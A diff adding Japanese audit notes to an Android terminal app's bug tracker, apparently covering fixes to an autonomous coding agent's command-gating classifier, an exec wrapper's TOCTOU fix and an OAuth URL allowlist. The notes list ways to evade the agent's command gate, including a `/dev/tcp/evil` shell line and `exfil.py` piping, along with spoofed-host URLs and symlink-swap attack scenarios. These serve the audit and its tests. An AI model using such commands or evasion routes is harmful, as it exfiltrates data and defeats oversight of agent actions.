@@ -1971,6 +1971,29 @@ coreutils: /sdcard/Download/patch-codex.sh: Permission denied
 2. ~~(b) は `generateRunScript` が `agent.orchestration.steps` を無視している事実を明示テストで固定するか、もしくは legacy `.sh` 生成時にも簡易的な複数ステップ直列実行（JS ループを介さない bash 側の逐次実行）を持たせるかを検討。~~ → 2026-07-16 `0ec6053fe` で「可視化」側を実装済み。~~フルの bash 側チェーン実行は引き続きフォローアップ。~~ → 2026-07-17 `8984a2e49` で実装済み（上記参照）。
 3. (a)(b) ともに着手・着地済み（コード変更は最小限、ネイティブ側のルーティング判定自体は無変更）。(b) のフルチェーン実行フォローアップも着地済み。いずれも実機での実際のスケジュール発火検証が未了。
 
+**→ 2026-07-28 実機なし敵対的再監査: (b) チェーン実行は ✅ 確信度高・問題なし / (a) `classifyProposedCommand` は ⚠️ 懸念あり → 修正実施（`6963b781b` / `48ea25768`）**
+
+**(1) チェーン実行（`8984a2e49`）— 問題なし**: `codexOrchestrationChainCommand()` は全ステップを単発経路と同一の `shelly-agent-driver.js --approval-policy untrusted --policy-json <同一>` で回しており、チェーンが単発より広い権限を得る経路は無い。`DRIVER_CWD` はループ外で 1 回だけ解決されループ内で再代入されない（全ステップ同一 workspace 境界）。carry-forward は `redact_secrets_text` → collapse → truncate の順（redact が先なので切り詰めで秘密が半端に残らない）で、失敗ステップの出力は success ガードの内側でしか carry されない。この「チェーンは単発に対して権限を足さない」という中心的主張が従来ドキュメントコメントだけでアサートされていなかったので `__tests__/agent-executor-chain-execution.test.ts` に 6 件追加（計 20 件 PASS、`48ea25768`）。
+
+**(2) `classifyProposedCommand` に実在した回避経路 4 つ（修正済み `6963b781b`）**:
+
+| # | 回避コマンド例 | 旧判定 | 新判定 |
+|---|---|---|---|
+| A | `cat exfil.py \| python3`（引数ではなくパイプで流し込む） | **L1/L2 とも allow** — `OPAQUE_SCRIPT_RE` の `\s+\S` が空振りし、かつ旧 `isPureRead` が `^` アンカーで先頭 `cat` しか見ないため「純粋 read」判定 | `opaque-script-exec` → gray |
+| B | `bash exfil.sh` / `sh ./deploy.sh` | allow — `sh`/`bash` は元の interpreter リストに無い。しかも bash は `exec 3<>/dev/tcp/host/port` という **組み込みネットワーク I/O** を持つ | `opaque-script-exec` → gray |
+| C | `cp src/a.ts "/sdcard/Download/a.ts"`（絶対パスを **引用符で囲むだけ**） | allow — `extractPaths` が引用符を落とさないので `isWithinRoot` がトークンを「`/` 始まりでない＝相対」と誤認し root に join して in-root 判定（`"~/x"` も同様） | `leaves-root` → gray |
+| D | `bash -lc 'exec 3<>/dev/tcp/evil/80'` | allow — `NETWORK_RE` に該当ツール名が無く、トークンが `3<>/dev/tcp/...` と fd 番号始まりなので `leaves-root` にも掛からない | `network-send` → gray |
+
+**修正内容**: `extractPaths` で前後の引用符を除去 / `OPAQUE_SCRIPT_RE` に `python2`・`pypy`・`lua(jit)`・`Rscript`・`julia`・`tclsh` を追加 / 新 `SHELL_SCRIPT_FILE_RE`（シェル + **スクリプトファイル引数** のみ。`-c`/`-lc` インラインは対象外）/ 新 `PIPED_INTERPRETER_RE`（パイプの受け手がインタプリタ・シェル。`awk` は read パイプラインの慣用句なので意図的に除外）/ 新 `SHELL_NET_DEVICE_RE`（`/dev/tcp`・`/dev/udp`）/ `isPureRead` を「全セグメントが read-only かつ `>` リダイレクト無し」に厳格化。
+
+**最重要の false-positive ガード**: `sh`/`bash` を素朴に interpreter リストへ足すことは **できない**。`scripts/shelly-agent-driver.js:487-489` が codex の argv 配列を flatten するため、分類対象文字列は事実上ほぼ全て `bash -lc '…'` で始まる。これを flag すると全コマンドが gray → unattended は fail-closed なので自律実行面が丸ごと死ぬ。この負のテスト（`bash -lc 'ls -la'` 等 6 パターンが `opaque-script-exec` を立てず L2 allow のまま）を明示的に追加してある。
+
+**テスト**: `__tests__/agent-boundary-policy.test.ts` 19 → 29 件、全 PASS。`__tests__/fixtures/gate-cases.json` に 6 件追加し `pnpm build:gate` で on-device アセット `shelly-gate-decide.js` を再生成 → `gate-decide-bundle.test.ts` の TS↔バンドル parity が 18 fixture × 2 で全 PASS（オンデバイス gate と TS が同一挙動であることを保証）。`npx tsc --noEmit` クリーン。
+
+**依然として残る既知の限界（テストで明示的に固定済み）**: `$PY exfil.py`（変数経由のインタプリタ）、`bash exfil`（拡張子なしスクリプト）、`./build/exfil`（ワークスペース内のビルド済みバイナリ）は今も未検出。コマンド文字列分類という MVP スコープの構造的限界で、恒久対策は uid/iptables レベルの egress 制限（P3 フォローアップ継続）。
+
+**実機でしか確認できない残余**: AlarmManager 発火による実際のスケジュール実行経路（`AgentRuntime.kt` はローカルコンパイル不可）。
+
 **優先度**: (a)(b) ともに P2 に降格（2026-07-16 `0a87b59fe`/`0ec6053fe`、2026-07-17 `8984a2e49` でそれぞれ修正着地、実機未検証。より強い恒久対策（(a)の outbound network 制限等）は引き続き P3 のフォローアップとして残す）。
 
 ---
@@ -1990,6 +2013,29 @@ coreutils: /sdcard/Download/patch-codex.sh: Permission denied
 **戻す条件**:
 1. CIビルドがコンパイルエラーなしで通ることを確認。
 2. 実機で `libexec_wrapper.so` 経由の子プロセス起動（bash 実行、CLI ラッパー等）が SIGSEGV せず動作することを確認。
+
+**→ 2026-07-28 実機なし静的監査: ⚠️ 確信度中（修正は安全・改善方向で確実、ただし「4096 が SIGSEGV の原因だった」という帰属は静的には確証できない）**
+
+この環境には C コンパイラが一切無い（gcc / clang / NDK / MSVC / WSL ディストリいずれも不在）ため実コンパイル計測は不可。代わりにソースから全ローカル配列を機械的に抽出してスタックフレーム最悪値を計算した（計算器ごと `__tests__/exec-wrapper-source-invariants.test.ts` に実装、CI で恒久的に強制、`b8d0869e2`）。
+
+**計算結果（スタックカラーリング 0 ＝ 最悪ケース、aarch64 `sizeof(char*)`=8）**:
+
+| 関数 | 修正後 (ARGC 1024 / ENVP 512) | 修正前 (両方 4096) |
+|---|---|---|
+| `shelly_execve_internal` | **73,968 B ≒ 72.2 KB** | ≒ 284 KB |
+| `shelly_posix_spawn_common` | **82,160 B ≒ 80.2 KB** | ≒ 328 KB |
+
+内訳（execve 側）: `rewrite_buf` 4096 + `codex_self_buf` 4096 + `codex_child_env` 4096 + `elf_fd_path` 32 + `codex_argv`×2 (8208×2) + `codex_env`×2 (4096×2) + `ld_buf`×3 (4128×3) + `codex_path_buf`×2 (4128×2) + `scrubbed_env` 4096 + `new_argv` 8208 + `app_env` 4096。実際の `-O2` ビルドでは LLVM の stack coloring が寿命の重ならない配列のスロットを共有するので真値はこれより小さい（概算 ~33 KB）。
+
+**安全余裕の評価**:
+- bionic のデフォルト pthread スタックは 1 MB、メインスレッドは `RLIMIT_STACK` = 8 MB。72–80 KB は最小でも 1 MB の 8% 未満で余裕は十分。
+- より本質的なのは **stack-clash** の観点: 本ファイルは `-fno-stack-protector` でビルドされ `-fstack-clash-protection` も付いていない（`CMakeLists.txt:16`）。大きなフレームは `sub sp, sp, #N` 一発で確保されるため、N が 4 KB のガードページを飛び越えると guard に触れずに未マップ領域へ書き込む。フレームを小さく保つこと自体が緩和策になっており、284/328 KB → 72/80 KB は約 4 倍の改善。
+
+**正直な留保**: 修正前の 284/328 KB でも 1 MB スレッドスタックには収まる計算になるので、「MAX_ARGC/MAX_ENVP=4096 が単独で SIGSEGV の原因だった」という上記の説明は **この数値だけでは裏付けられない**。実際に落ちたコンテキスト（呼び出し元が既に深い / スタックの小さいスレッド / bionic `posix_spawn` の vfork 子が親の残スタック上で走るケース等）が別途あった可能性が高い。修正自体は無害かつ改善方向で確実だが、「これで SIGSEGV が止まった」は実機でしか確定できない。
+
+**overflow ガードの再検証**: `if (i == MAX_ENVP && source[i] != NULL) return -1;` が `scrub_system_envp` / `scrub_codex_child_envp` / `add_app_loader_envp` / `add_codex_helper_envp` の 4 箇所すべてに存在することを確認・テストで固定。`source[MAX_ENVP]` の読み取りが (a) execve/posix_spawn の NULL 終端契約、または (b) ローカル生成配列の `MAX_ENVP+1` 容量、のいずれかで境界内であることも再確認した。
+
+**推奨フォローアップ（今回は未実施）**: `CMakeLists.txt` の `exec_wrapper` に `-Wframe-larger-than=32768`（できれば `-Werror=frame-larger-than`）を足せば NDK 実コンパイル時に実フレームサイズを CI が構造的に強制できる。ローカルでコンパイル確認できず CI を壊すリスクがあるため今回は入れず、jest 側の静的計算器で代替した。
 
 **優先度**: P1（実際に発生していたクラッシュの根治だが、実機ランタイム検証が済むまでは「解決済み」と見なさない）
 
@@ -2226,6 +2272,31 @@ A が最小コスト、B が cleanest、C が radical。Codex review で意見�
 2. 実機で bash REPL / codex TUI が通常通り起動し、SIGSEGV や `$0` 起因の破損がないことを確認。 ✅ 完了
 3. `vim`/`tmux`/`make`/`less`/`nano`/`gh`/`gpg`/`unzip`/`ssh-keygen` の bashrc ラッパー修正 (`1bec5af86`) の実機再検証。
 
+**→ 2026-07-28 実機なし静的監査（コードレベルで到達可能な最大確信）: ✅ 確信度高・問題なし**
+
+`c7a39c20c` の実コードを `open`/`read`/`close`/`execve` の呼び出し順序と fd の寿命まで精読した結果、**「理想的な修正」＝ fexecve 相当が実際に入っている**ことを確認した。
+
+- `open_verified_elf_fd()`（exec-wrapper.c:630-652）は `raw_open_readonly(path)` を **1回だけ** 呼び、その **同一 fd** から ELF magic を読み（EINTR retry 付き）、検証成功時のみ `F_DUPFD` で fd≥100 に複製して返す。パスによる再オープン経路は存在しない。`O_CLOEXEC` は意図的に不採用（fd が execve を跨いで linker64 に渡る必要があるため）。
+- `shelly_execve_internal`（1126-1128）/ `shelly_posix_spawn_common`（1279-1281）はどちらも `format_proc_fd_path(elf_fd_path, …, elf_fd)` → `build_linker_argv(elf_fd_path, argv, new_argv)` で linker argv[1] を組む。可変な `rewritten` パスを linker argv に渡す経路は **1つも残っていない**（`build_linker_argv(rewritten, …)` の一致ゼロ）。exec 対象の `LINKER64` は `/system/bin/` 配下で app uid から書き換え不能。
+- **なぜ構造的に閉じるのか**: Linux の `/proc/self/fd/N` は magic symlink で、その open は名前の再解決ではなく `struct file` が保持する dentry/vfsmount への `nd_jump_link()`。つまり open 済み inode へ直接ジャンプする。glibc の `fexecve()` の実装そのものが `execve("/proc/self/fd/N", …)` であり、本修正はそれと同値（違いは exec 対象が linker64 で、検証済み fd をその argv[1] として渡す点だけ）。
+
+**攻撃シナリオと、それが塞がれる理由**:
+
+| # | 旧コードでの攻撃 | 新コードでの結果 |
+|---|---|---|
+| A | `is_elf(P)` 通過直後に P を別 ELF へ symlink 差し替え → linker64 が別ファイルを load | `/proc/self/fd/N` は検証済み inode に固定。P の名前をどう差し替えても load 対象は変わらない |
+| B | P を rename/差し替えて、app_data_file の exec 制限を linker64 経由で迂回し任意 ELF を起動 | 同上。fd が指す inode 以外は起動されない |
+| C | チェック時は無害な bundled binary、exec 直前だけ攻撃者 ELF に差し替え（TOCTOU の本命） | inode は open の瞬間に確定するため、window そのものが存在しない |
+
+**残余リスク（いずれも「別 inode がサイレントに実行される」タイプではない）**:
+1. `posix_spawn` の `file_actions` は子側で exec 直前に走るため、`addclose(N)` / `adddup2(x, N)` で fd N を潰す余地は理論上残る（`ELF_FD_MIN=100` はこれへのヒューリスティック防御、既記録の非 blocking 指摘）。潰された場合の結果は「linker64 が `/proc/self/fd/N` を open できず exec 失敗」であり、argv はパスに fallback しないので別 inode の実行にはならない。
+2. 同一 inode への **in-place 上書き** は fd 固定では防げない。ただし `fexecve` でも同じで、かつ magic 検証は「linker64 経由で起動するか否か」という **ルーティング判断** であってアクセス制御判断ではないため権限昇格にならない。
+3. fd が `O_CLOEXEC` なしで子に漏れる（自分自身のバイナリへの read-only fd 1本）。設計上の意図で、カーネルが `/proc/self/exe` で既に露出している情報と同等。
+
+**追加した回帰ロック**: `__tests__/exec-wrapper-source-invariants.test.ts`（新規、`b8d0869e2`）— `is_elf(`/`should_linker_exec(` の消滅、`open_verified_elf_fd` の「1 open・同一 fd で magic 検証・O_CLOEXEC なし」、両 exec 経路が `format_proc_fd_path` 由来の argv[1] を使うこと、`build_linker_argv(rewritten, …)` の不在、`close_elf_fd` 設置数、build marker を静的にアサートする。NDK が無い環境でも CI で守れる。
+
+**実機でしか確認できない残余**: linker64 が argv[1] を `$ORIGIN` 展開や `realpath()` に使う実装だった場合、`/proc/self/fd` がベースディレクトリ扱いになる可能性（DT_RUNPATH に `$ORIGIN` を持つ bundled binary があれば影響）。2026-07-16 の実機部分検証で bash/node/git/python3/curl/rg/codex TUI が正常起動しているので実害は観測されていない。
+
 **優先度**: P1 → ほぼ検証完了（vimラッパー修正の再検証のみ残存）
 
 ---
@@ -2444,6 +2515,22 @@ coreutils: /proc/self/net/tcp6: Permission denied
 ---
 
 ### bug #102/#115 phase 1.2 — Google OAuth Custom Tabs trampoline (Codex 設計レビュー反映 2026-05-08) — ✅ 解消済み（2026-07-17、実機未検証）
+
+**→ 2026-07-28 実機なし監査: ⚠️ 懸念あり → 修正実施（`ab9bc3528`）。本 entry の「JS 側の再検証があるため実害は無い」という記述は事実誤認だった。**
+
+**発見**: JS 側（`app/_layout.tsx` 旧 1352 行）のホスト完全一致チェックは `if (authMode === 'in-app')` の **内側にしかなく**、`in-app → external-browser` への *昇格* ルールであって *検証* ルールではなかった。すなわち `{"authMode":"external-browser"}` を最初から名乗るキュー行は `^https?://` 以外の検査を一切受けずに `WebBrowser.openBrowserAsync()`（＝ユーザーの実 Chrome プロセス、実 Cookie／実セッション）へ渡っていた。**C 側だけで完結する経路が実在した。** そして C 側 `is_google_auth_url()` は `strstr(url, "://accounts.google.com/")` の部分一致なので、`https://evil.example/r?next=https://accounts.google.com/` のようにクエリ内に文字列が現れるだけの任意 URL がその flag を得られた。つまり C の部分一致が実ブラウザ起動の実質的な決定権を持っていた。
+
+**severity の正直な評価: Low**。`$HOME/.shelly-deep-link-queue` はアプリ自身の HOME 上のただのファイルで、アプリサンドボックス内の任意プロセス（codex が実行するスクリプト等）が直接 append できる。したがって C バイナリは元々権限境界ではなく、この経路を塞いでも「サンドボックス内から実ブラウザを開ける」こと自体は変わらない。それでも「Google OAuth ホストだけが外部ブラウザへ行く」という設計上の不変条件が **どこにも強制されていなかった** のは事実なので、強制点を 1 つ作った。
+
+**修正**:
+1. 新規 `lib/deep-link-queue-policy.ts` — `resolveQueueLine()` が 形状パース → スキーム許可（http/https のみ）→ `new URL()` ホスト解析 → **ホスト非許可の external-browser 要求を in-app へ降格** → 許可ホストの in-app 要求を昇格、の順で判定。`app/_layout.tsx` の `drainQueue` はこれを呼ぶだけになり、ロジックが単体テスト可能になった（従来は useEffect クロージャ内でテスト不能）。
+2. `shelly-xdg-open.c` の `is_google_auth_url()` を `strstr` から新 `url_host_equals()` に置換 — scheme 後の authority を切り出し、**最後の `@` より後**を host とし（`https://accounts.google.com@evil.example/` を正しく `evil.example` と判定）、`:port` を除去して `strncasecmp` で完全一致比較。
+
+許可ホストは `accounts.google.com` / `codeassist.google.com` の 2 つのみで、C 側・TS ポリシー・`shelly-gemini-auth.js` の 3 箇所が一致していることもテストでアサートしている。
+
+**テスト**: 新規 `__tests__/deep-link-queue-policy.test.ts` 12 件全 PASS。ご指摘の `evil-accounts.google.com.attacker.example` を含む 8 種のホスト詐称（`accounts.google.com.attacker.example` / クエリ埋め込み / フラグメント埋め込み / userinfo 詐称 `accounts.google.com@attacker.example` / `xaccounts.google.com` / パス埋め込み）が **`external-browser` を明示宣言していても降格される**ことを直接アサート。`file:`／`content:`／`intent:`／`javascript:`／`shelly:` の拒否、`www.`／`drive.`／`mail.google.com` や YouTube が in-app のままであること、大文字ホスト・ポート付きの正規化も固定。C 側は実コンパイルできないためソース不変条件（`strstr` の消滅、`@`／`:` 切り出し、`strncasecmp`、`<strings.h>` include、3 ファイル間のホスト許可リスト一致）を静的にアサートしている。
+
+**実機でしか確認できない残余**: Custom Tabs／Knox の実機互換性（下表 A 項目）、実 Gemini CLI バイナリでの `gemini auth login` サブコマンド名・credential path、複数 OAuth 同時実行の single-flight lock（下表 E、意図的未実装）、`url_host_equals()` の NDK 実コンパイル（CI で検証される想定、本セッションでは未確認）。
 
 **2026-07-17 実装**: 調査の結果、Phase 1.2 の大部分（`app/_layout.tsx`の`drainQueue`によるprovider/authMode分岐、`shelly-xdg-open.c`のGoogle OAuth URL検出→`external-browser`キュー投入）は既にmainに着地済み（`22e935084`）と判明——本entryの記述時点から状況が進んでいた。残っていた2点を実装: (1) `app/_layout.tsx`にdefense-in-depthの自動昇格を追加——`authMode:"in-app"`のまま届いたキューでもhostが`accounts.google.com`ならexternal-browserへ強制昇格（Anthropic/GitHubのin-appパスは無変更）。(2) 新規`shelly-gemini-auth.js`（既存`shelly-codex-auth.js`と同型のCLIラッパー、Experimental分類のためbashrc/launcher配線なしのstandalone asset）——Gemini CLIの出力をスキャンしGoogle OAuth URLを検出（`new URL()`のhostベース判定、substring一致ではない）、`~/.gemini/credentials.json`のmtime+`gemini --version`スモークチェックで完了検知（Custom Tabsのbrowser-resultイベントに依存しない設計、doc記載の絶対禁止事項4点は構造上不可能）。新規テスト20件。`tsc --noEmit`クリーン、jest既知ベースライン通り新規失敗ゼロ。**残タスク**: Custom Tabs/Knoxの実機互換性（doc表のA項目）、実際のGemini CLIバイナリでの`gemini auth login`サブコマンド名・credential pathの確認（本repoにGemini CLIバイナリ非同梱のため未検証、`-- <cmd> [args...]`でオーバーライド可能）、複数OAuth同時実行のsingle-flight lock（doc表のE項目、意図的に未実装として記録）。
 
